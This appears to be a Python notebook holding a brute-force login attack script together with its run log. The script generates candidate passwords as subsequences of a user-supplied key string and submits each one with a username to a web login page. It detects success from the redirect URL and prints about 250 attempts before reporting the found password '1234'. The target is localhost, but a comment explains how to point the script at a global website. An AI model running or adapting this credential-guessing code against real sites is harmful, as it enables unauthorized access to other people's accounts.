# %%
import requests
import os
import socket

# %%
ip=input("ENTER IP ==> ")
port=input("ENTER PORT ==> ")
# Out:
# ENTER IP ==> 127.0.0.1
# ENTER PORT ==> 80

# %%
key=input("ENTER KEYS  FOR BRUTEFORCE ATTACK ==> ")
username=input("ENTER USERNAME FOR BRUTEFORCE ATTACK ==> ")
# Out:
# ENTER KEYS  FOR BRUTEFORCE ATTACK ==> 1224445533444
# ENTER USERNAME FOR BRUTEFORCE ATTACK ==> Akhil

# %%
allcombo=set()
def getallcombination(key,start,current):
    if start>=len(key):
        return 
    allcombo.add(current+key[start])
    getallcombination(key,start+1,current+key[start])
    getallcombination(key,start+1,current)
getallcombination(key,0,"")

# %%
allcombo=list(allcombo)
print(allcombo)

# %%
found=False
for x in allcombo:
    print("TRYING PASSWORD ==> "+ x)
    #I HAVE WRITTEN PATH TO MY WEBSITE IN MY LOCALHOST 
    #IF YOU WANT TO TEST IN GLOBAL WEBSITE MAKE THE URL LIKE ==> HTTPS://IP:PORT
    t=requests.get("http://localhost/php/bruteforce%20hacking/",{"user":username,"pass":x})
    #I HAVE USED BOSS IN MY URL FOR SUCCESS AUTHENTICATION YOU CAN USE ANYTHING  THAT YOU CAN FIND IN SUCCESS AUTHENTICATION IN THAT WEBSITE  
    if "boss" in t.url:
        found=True
        print("SUCCESSFUL THE PASSWORD FOUND IS ==> "+x)
        break;
if found==False:
    print("PASSWORD NOT IN KEY")
# Out:
# TRYING PASSWORD ==> 124554
# TRYING PASSWORD ==> 1445344
# TRYING PASSWORD ==> 53444
# TRYING PASSWORD ==> 124455
# TRYING PASSWORD ==> 122334
# TRYING PASSWORD ==> 1245533444
# TRYING PASSWORD ==> 4455444
# TRYING PASSWORD ==> 255444
# TRYING PASSWORD ==> 453444
# TRYING PASSWORD ==> 433444
# TRYING PASSWORD ==> 14443
# TRYING PASSWORD ==> 2244553
# TRYING PASSWORD ==> 12244553
# TRYING PASSWORD ==> 224534
# TRYING PASSWORD ==> 244455334
# TRYING PASSWORD ==> 1225534
# TRYING PASSWORD ==> 44544
# TRYING PASSWORD ==> 244553
# TRYING PASSWORD ==> 24445544
# TRYING PASSWORD ==> 453344
# TRYING PASSWORD ==> 5533444
# TRYING PASSWORD ==> 123444
# TRYING PASSWORD ==> 122444553444
# TRYING PASSWORD ==> 14553
# TRYING PASSWORD ==> 14344
# TRYING PASSWORD ==> 2244533444
# TRYING PASSWORD ==> 1553344
# TRYING PASSWORD ==> 144533444
# TRYING PASSWORD ==> 5334
# TRYING PASSWORD ==> 24444
# TRYING PASSWORD ==> 12244533444
# TRYING PASSWORD ==> 12255334
# TRYING PASSWORD ==> 12244453444
# TRYING PASSWORD ==> 4533
# TRYING PASSWORD ==> 12243344
# TRYING PASSWORD ==> 12453
# TRYING PASSWORD ==> 1245444
# TRYING PASSWORD ==> 12255
# TRYING PASSWORD ==> 455
# TRYING PASSWORD ==> 22455344
# TRYING PASSWORD ==> 124453344
# TRYING PASSWORD ==> 122444444
# TRYING PASSWORD ==> 44455344
# TRYING PASSWORD ==> 224455444
# TRYING PASSWORD ==> 5544
# TRYING PASSWORD ==> 2234
# TRYING PASSWORD ==> 2243344
# TRYING PASSWORD ==> 12245544
# TRYING PASSWORD ==> 2444553444
# TRYING PASSWORD ==> 1244533
# TRYING PASSWORD ==> 244433
# TRYING PASSWORD ==> 124445334
# TRYING PASSWORD ==> 15344
# TRYING PASSWORD ==> 12245344
# TRYING PASSWORD ==> 33
# TRYING PASSWORD ==> 1455344
# TRYING PASSWORD ==> 244444
# TRYING PASSWORD ==> 43
# TRYING PASSWORD ==> 2244553444
# TRYING PASSWORD ==> 2444344
# TRYING PASSWORD ==> 244
# TRYING PASSWORD ==> 4544
# TRYING PASSWORD ==> 1243444
# TRYING PASSWORD ==> 155334
# TRYING PASSWORD ==> 2444444
# TRYING PASSWORD ==> 1453344
# TRYING PASSWORD ==> 45344
# TRYING PASSWORD ==> 1533
# TRYING PASSWORD ==> 1223
# TRYING PASSWORD ==> 22455444
# TRYING PASSWORD ==> 24433
# TRYING PASSWORD ==> 1553
# TRYING PASSWORD ==> 12444344
# TRYING PASSWORD ==> 2245344
# TRYING PASSWORD ==> 12244453
# TRYING PASSWORD ==> 24443
# TRYING PASSWORD ==> 45
# TRYING PASSWORD ==> 1233444
# TRYING PASSWORD ==> 14455344
# TRYING PASSWORD ==> 224533444
# TRYING PASSWORD ==> 14444
# TRYING PASSWORD ==> 12455
# TRYING PASSWORD ==> 12245334
# TRYING PASSWORD ==> 1224533444
# TRYING PASSWORD ==> 444553
# TRYING PASSWORD ==> 1224544
# TRYING PASSWORD ==> 1444533
# TRYING PASSWORD ==> 15334
# TRYING PASSWORD ==> 13344
# TRYING PASSWORD ==> 2445
# TRYING PASSWORD ==> 14443344
# TRYING PASSWORD ==> 2244455334
# TRYING PASSWORD ==> 224455
# TRYING PASSWORD ==> 125344
# TRYING PASSWORD ==> 244453444
# TRYING PASSWORD ==> 22445444
# TRYING PASSWORD ==> 14554
# TRYING PASSWORD ==> 122433
# TRYING PASSWORD ==> 234
# TRYING PASSWORD ==> 145334
# TRYING PASSWORD ==> 1244544
# TRYING PASSWORD ==> 1253444
# TRYING PASSWORD ==> 1445334
# TRYING PASSWORD ==> 22444554
# TRYING PASSWORD ==> 12245444
# TRYING PASSWORD ==> 22444553344
# TRYING PASSWORD ==> 24554
# TRYING PASSWORD ==> 1225533444
# TRYING PASSWORD ==> 122445344
# TRYING PASSWORD ==> 1244334
# TRYING PASSWORD ==> 123
# TRYING PASSWORD ==> 2433
# TRYING PASSWORD ==> 2453444
# TRYING PASSWORD ==> 14534
# TRYING PASSWORD ==> 125533
# TRYING PASSWORD ==> 12544
# TRYING PASSWORD ==> 224433444
# TRYING PASSWORD ==> 2253
# TRYING PASSWORD ==> 2455344
# TRYING PASSWORD ==> 125533444
# TRYING PASSWORD ==> 1223444
# TRYING PASSWORD ==> 15533444
# TRYING PASSWORD ==> 1224455
# TRYING PASSWORD ==> 22344
# TRYING PASSWORD ==> 15534
# TRYING PASSWORD ==> 24344
# TRYING PASSWORD ==> 12444554
# TRYING PASSWORD ==> 22444533
# TRYING PASSWORD ==> 224445533
# TRYING PASSWORD ==> 434
# TRYING PASSWORD ==> 1533444
# TRYING PASSWORD ==> 1244444
# TRYING PASSWORD ==> 2244553344
# TRYING PASSWORD ==> 553
# TRYING PASSWORD ==> 254
# TRYING PASSWORD ==> 3344
# TRYING PASSWORD ==> 12255344
# TRYING PASSWORD ==> 245533
# TRYING PASSWORD ==> 124344
# TRYING PASSWORD ==> 22
# TRYING PASSWORD ==> 44553344
# TRYING PASSWORD ==> 1455444
# TRYING PASSWORD ==> 1224433
# TRYING PASSWORD ==> 44453444
# TRYING PASSWORD ==> 444553344
# TRYING PASSWORD ==> 244553444
# TRYING PASSWORD ==> 245534
# TRYING PASSWORD ==> 4443344
# TRYING PASSWORD ==> 553444
# TRYING PASSWORD ==> 145533444
# TRYING PASSWORD ==> 1244455
# TRYING PASSWORD ==> 1244454
# TRYING PASSWORD ==> 12443
# TRYING PASSWORD ==> 1444334
# TRYING PASSWORD ==> 1455334
# TRYING PASSWORD ==> 2444533444
# TRYING PASSWORD ==> 144334
# TRYING PASSWORD ==> 2433444
# TRYING PASSWORD ==> 2244534
# TRYING PASSWORD ==> 14445
# TRYING PASSWORD ==> 5444
# TRYING PASSWORD ==> 145534
# TRYING PASSWORD ==> 22534
# TRYING PASSWORD ==> 124443
# TRYING PASSWORD ==> 4
# TRYING PASSWORD ==> 12233
# TRYING PASSWORD ==> 245544
# TRYING PASSWORD ==> 1443
# TRYING PASSWORD ==> 2544
# TRYING PASSWORD ==> 444544
# TRYING PASSWORD ==> 44553
# TRYING PASSWORD ==> 54
# TRYING PASSWORD ==> 22433444
# TRYING PASSWORD ==> 444334
# TRYING PASSWORD ==> 1
# TRYING PASSWORD ==> 44455334
# TRYING PASSWORD ==> 453
# TRYING PASSWORD ==> 12444553444
# TRYING PASSWORD ==> 1444553344
# TRYING PASSWORD ==> 224445
# TRYING PASSWORD ==> 24434
# TRYING PASSWORD ==> 12444533
# TRYING PASSWORD ==> 1554
# TRYING PASSWORD ==> 25544
# TRYING PASSWORD ==> 125334
# TRYING PASSWORD ==> 44455
# TRYING PASSWORD ==> 122443444
# TRYING PASSWORD ==> 2244
# TRYING PASSWORD ==> 224453
# TRYING PASSWORD ==> 44453344
# TRYING PASSWORD ==> 12254
# TRYING PASSWORD ==> 22445534
# TRYING PASSWORD ==> 4453
# TRYING PASSWORD ==> 443
# TRYING PASSWORD ==> 24455444
# TRYING PASSWORD ==> 1445544
# TRYING PASSWORD ==> 2233444
# TRYING PASSWORD ==> 244455
# TRYING PASSWORD ==> 124445
# TRYING PASSWORD ==> 144455
# TRYING PASSWORD ==> 22544
# TRYING PASSWORD ==> 445533444
# TRYING PASSWORD ==> 1244453
# TRYING PASSWORD ==> 155
# TRYING PASSWORD ==> 224334
# TRYING PASSWORD ==> 144455444
# TRYING PASSWORD ==> 1534
# TRYING PASSWORD ==> 2444553344
# TRYING PASSWORD ==> 1224445344
# TRYING PASSWORD ==> 122453
# TRYING PASSWORD ==> 224455344
# TRYING PASSWORD ==> 12554
# TRYING PASSWORD ==> 2255444
# TRYING PASSWORD ==> 12445344
# TRYING PASSWORD ==> 444344
# TRYING PASSWORD ==> 124553
# TRYING PASSWORD ==> 122455334
# TRYING PASSWORD ==> 1445534
# TRYING PASSWORD ==> 2255344
# TRYING PASSWORD ==> 12244553444
# TRYING PASSWORD ==> 24455
# TRYING PASSWORD ==> 124444
# TRYING PASSWORD ==> 244455444
# TRYING PASSWORD ==> 1444344
# TRYING PASSWORD ==> 12553
# TRYING PASSWORD ==> 445344
# TRYING PASSWORD ==> 2244455344
# TRYING PASSWORD ==> 2444334
# TRYING PASSWORD ==> 1445444
# TRYING PASSWORD ==> 224443344
# TRYING PASSWORD ==> 12244455
# TRYING PASSWORD ==> 224553
# TRYING PASSWORD ==> 24455334
# TRYING PASSWORD ==> 144553344
# TRYING PASSWORD ==> 122553
# TRYING PASSWORD ==> 12244544
# TRYING PASSWORD ==> 134
# TRYING PASSWORD ==> 22444544
# TRYING PASSWORD ==> 24445533444
# TRYING PASSWORD ==> 1225334
# TRYING PASSWORD ==> 122534
# TRYING PASSWORD ==> 14533444
# TRYING PASSWORD ==> 14533
# TRYING PASSWORD ==> 145344
# TRYING PASSWORD ==> 553344
# TRYING PASSWORD ==> 25344
# TRYING PASSWORD ==> 1253344
# TRYING PASSWORD ==> 24453
# TRYING PASSWORD ==> 2453
# TRYING PASSWORD ==> 245344
# TRYING PASSWORD ==> 2344
# TRYING PASSWORD ==> 225334
# TRYING PASSWORD ==> 12244453344
# TRYING PASSWORD ==> 22445533
# TRYING PASSWORD ==> 1224445533444
# TRYING PASSWORD ==> 1224434
# TRYING PASSWORD ==> 224533
# TRYING PASSWORD ==> 22445
# TRYING PASSWORD ==> 144444
# TRYING PASSWORD ==> 444534
# TRYING PASSWORD ==> 1234
# SUCCESSFUL THE PASSWORD FOUND IS ==> 1234
